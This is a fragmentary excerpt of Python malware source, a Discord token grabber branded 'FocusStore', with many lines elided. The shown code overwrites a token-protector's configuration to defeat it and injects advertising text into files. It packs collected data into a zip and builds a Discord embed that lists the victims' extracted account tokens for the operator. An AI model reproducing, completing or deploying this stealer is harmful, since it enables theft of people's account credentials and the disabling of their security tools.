...
class FocusCommanderTokenGrabberV2(Functions):
    def __init__(self):
        ...
        if ntpath.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    ...
                    return
                item['Rdimo_just_shit_on_this_token_protector'] = "discord.gg/focusstore"
    ...
    def finish(self):
                ...
                with open(path, "r", errors="ignore") as ff:
                    ...
                    if not x:
                        ...
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write("discord.gg/focusstore")
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(x + "\n\ndiscord.gg/focusstore")

        _zipfile = ntpath.join(self.appdata, f'FocusStore.zip')
        ...
        embed = {
            ...
            'embeds': [
                {
                    'author': {
                        'name': f'FOCUS STORE A MELHOR LOJA DO MOMENTO',
                    ...
                    'fields': [
                        ...
                        },
                        {
                            'name': '**Tokens:**',
                            'value': f'''```yaml
                                {tokens if tokens else "Nenhum token extraido"}```
                            '''.replace(' ', ''),
                            'inline': False
                        },
                        {
                    ...
                    'footer': {
                        'text': 'E a FocusStore ne BB | discord.gg/focusstore'
                    }
                }
            ]
        }
...
if __name__ == "__main__" and os.name == "nt":
    try:
        ...
        os._exit(0)
    asyncio.run(FocusCommanderTokenGrabberV2().init())
